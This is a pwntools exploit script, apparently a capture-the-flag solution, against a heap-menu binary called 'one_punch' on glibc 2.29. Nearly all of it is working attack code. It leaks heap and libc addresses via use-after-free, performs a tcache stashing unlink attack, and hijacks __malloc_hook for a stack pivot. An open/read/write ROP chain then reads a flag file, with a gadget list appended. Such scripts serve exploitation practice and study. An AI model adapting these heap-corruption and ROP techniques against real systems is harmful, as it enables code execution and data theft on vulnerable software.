#!/usr/bin/env python3

from pwn import *

context(os="linux", arch="amd64", log_level="info")
localfile = "./one_punch"
locallibc = "../glibc_versions/2.29/x64_tcache/lib/libc.so.6"
pf      = lambda name,num           :log.info(name + ": 0x%x" % num)
g       = lambda x                  :next(libc.search(asm(x)))

def debut(idx, name):
    io.recvuntil("> ")
    io.sendline("1")
    io.recvuntil("idx: ")
    io.sendline(str(idx))
    io.recvuntil("hero name: ")
    io.send(name)

def rename(idx, name):
    io.recvuntil("> ")
    io.sendline("2")
    io.recvuntil("idx: ")
    io.sendline(str(idx))
    io.recvuntil("hero name: ")
    io.send(name)

def show(idx):
    io.recvuntil("> ")
    io.sendline("3")
    io.recvuntil("idx: ")
    io.sendline(str(idx))

def retire(idx):
    io.recvuntil("> ")
    io.sendline("4")
    io.recvuntil("idx: ")
    io.sendline(str(idx))

def backdoor(s):
    io.recvuntil("> ")
    io.sendline(str(0xc388))
    sleep(0.1)
    io.send(s)

def exp():
    for i in range(6):
        debut(0, b"A"*0x80)
        retire(0)

    # leak heap base
    debut(0, b"A"*0x80)
    retire(0)
    show(0)
    io.recvuntil("hero name: ")
    heap_base = u64(io.recvline().strip(b"\n").ljust(8, b"\x00")) & (~0xfff)
    pf("heap base", heap_base)

    # leak libc base
    debut(0, b"A"*0x80)
    debut(1, b"A"*0x80)
    retire(0)
    show(0)
    io.recvuntil("hero name: ")
    libc_base = u64(io.recvline().strip(b"\n").ljust(8, b"\x00")) - 0x3B3CA0
    pf("libc base", libc_base)

    # tcache stashing unlink attack
    for i in range(6):
        debut(0, b"A"*0xf8)
        retire(0)
    for i in range(7):
        debut(0, b"A"*0x400)
        retire(0)
    # gdb.attach(io, "b *$rebase(0x16AB)")
    debut(0, b"A"*0x400)
    debut(1, b"A"*0x400)
    retire(0)
    debut(0, b"A"*0x300)

    debut(0, b"A"*0x400)
    debut(1, b"A"*0x400)
    retire(0)
    debut(1, b"A"*0x300)
    debut(1, b"A"*0x200)

    rename(0, b"A"*0x308 + p64(0x101) + p64(heap_base+0x2d20) + p64(heap_base+0x1f))
    debut(0, b"./flag".ljust(0xf8, b"\x00"))

    #
    debut(0, b"A"*0x217)
    debut(1, b"A"*0x217)
    retire(0)
    retire(1)

    rename(1, p64(libc_base+libc.sym["__malloc_hook"]))
    backdoor("A")
    backdoor(p64(libc_base+0xbdfd1))
    
    # rop
    poprdi = libc_base + 0x219c0
    poprsi = libc_base + 0x24435
    poprdx = libc_base + 0x1b9a
    poprax = libc_base + 0x37fa8
    syscall= libc_base + g("syscall; ret")

    ## open
    rops  = p64(poprdi) + p64(heap_base+0x2d30)
    rops += p64(poprsi) + p64(0)
    rops += p64(poprdx) + p64(0)
    rops += p64(poprax) + p64(2)
    rops += p64(syscall)

    ## read
    rops += p64(poprdi) + p64(3)
    rops += p64(poprsi) + p64(heap_base+0x2d30)
    rops += p64(poprdx) + p64(20)
    rops += p64(poprax) + p64(0)
    rops += p64(syscall)

    ## write
    rops += p64(poprdi) + p64(1)
    rops += p64(poprsi) + p64(heap_base+0x2d30)
    rops += p64(poprdx) + p64(20)
    rops += p64(poprax) + p64(1)
    rops += p64(syscall)

    # gdb.attach(io, """b *$rebase(0x16AB)
    # b *$rebase(0x139C)
    # """)

    debut(0, rops.ljust(0x80, b"\x00"))

    io.interactive(1)

argc = len(sys.argv)
if argc == 1:
    io = process(localfile)
else:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)

elf = ELF(localfile)
libc = ELF(locallibc)
exp()

"""
0x00000000000bdfd1 : add rsp, 0x48 ; ret
0x00000000000219c0 : pop rdi ; ret
0x0000000000024435 : pop rsi ; ret
0x0000000000001b9a : pop rdx ; ret
0x0000000000037fa8 : pop rax ; ret
0x000000000000275b : syscall
"""